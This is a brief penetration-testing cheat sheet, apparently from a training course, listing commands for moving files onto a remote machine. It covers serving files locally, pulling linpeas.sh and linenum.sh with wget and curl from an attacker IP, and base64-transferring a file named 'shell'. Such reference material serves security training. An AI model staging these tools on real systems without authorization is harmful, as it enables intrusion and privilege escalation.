
|   |   |
|---|---|
|**Transferring Files**||
|`python3 -m http.server 8000`|Start a local webserver|
|`wget http://10.10.14.1:8000/linpeas.sh`|Download a file on the remote server from our local machine|
|`curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`|Download a file on the remote server from our local machine|
|`scp linenum.sh user@remotehost:/tmp/linenum.sh`|Transfer a file to the remote server with `scp` (requires SSH access)|
|`base64 shell -w 0`|Convert a file to `base64`|
|`echo f0VMR...SNIO...InmDwU \| base64 -d > shell`|Convert a file from `base64` back to its orig|
|`md5sum shell`|Check the file's `md5sum` to ensure it converted correctly|
